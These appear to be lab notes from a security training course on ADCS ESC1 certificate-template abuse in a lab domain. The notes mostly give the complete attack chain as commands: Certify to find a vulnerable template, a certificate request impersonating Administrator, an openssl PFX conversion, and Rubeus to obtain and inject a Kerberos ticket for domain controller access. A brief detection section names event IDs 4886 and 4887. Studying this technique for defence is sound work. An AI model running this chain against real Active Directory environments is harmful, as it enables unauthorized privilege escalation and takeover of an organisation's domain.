# PKI - ESC1 (Public Key Infrastructure - Enterprise Certificate Service abuse)

A vulnerable certificate template allows:

low-privileged enrollment </br>
client authentication </br>
user-supplied subject/SAN </br>

So the attacker can request a certificate for: administrator@domain.local. Even though they are not Administrator.
Then they use the certificate for Kerberos authentication.

## To begin with, we will use Certify to scan the environment for vulnerabilities in the PKI infrastructure:

```
PS C:\Users\bob\Downloads> .\Certify.exe find /vulnerable
```
<img width="1295" height="552" alt="image" src="https://github.com/user-attachments/assets/df37b88d-7ad1-4ab7-b1a3-f4c8c2ea62c6" />

We can tell that the name of the CA in the environment is PKI.eagle.local\eagle-PKI-CA, and the vulnerable template is named UserCert. The template is vulnerable because:

1.All Domain users can request a certificate on this template. </br>

2.The flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is present, allowing the requester to specify the SAN (therefore, any user can request a certificate as any other user in the network, including privileged ones). </br>

3.Manager approval is not required (the certificate gets issued immediately after the request without approval).</br>

4.The certificate can be used for 'Client Authentication' (we can use it for login/authentication).</br>

## Abuse the template ( get cert.pem)
```
.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
```

<img width="1150" height="657" alt="image" src="https://github.com/user-attachments/assets/d66d4830-3d54-4945-8c98-cc56ead926f8" />

## We need to convert the PEM certificate to the PFX format

```
MinAPhay69@htb[/htb]$ sed -i 's/\s\s\+/\n/g' cert.pem
```

## Then we can execute the openssl command mentioned in the output of Certify.

```
MinAPhay69@htb[/htb]$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

## Now that we have the certificate in a usable PFX format (which Rubeus supports), we can request a Kerberos TGT for the account Administrator and authenticate with the certificate:

```
.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
```
<img width="938" height="552" alt="image" src="https://github.com/user-attachments/assets/6b3c8bc6-fd48-49d2-8d85-d63d0957b62b" />

## After successful authentication, we will be able to list the content of the C$ share on DC1:

<img width="923" height="457" alt="image" src="https://github.com/user-attachments/assets/570cfe48-6d81-4aca-b889-dd6a824af11f" />

# Detect 

## Event ID 4886 & 4887

<img width="695" height="380" alt="image" src="https://github.com/user-attachments/assets/262c82dd-e939-4876-96c1-7fc9e1f908ae" />

<img width="831" height="486" alt="image" src="https://github.com/user-attachments/assets/3891f3e5-c79a-4939-a88d-3b8656dc408e" />




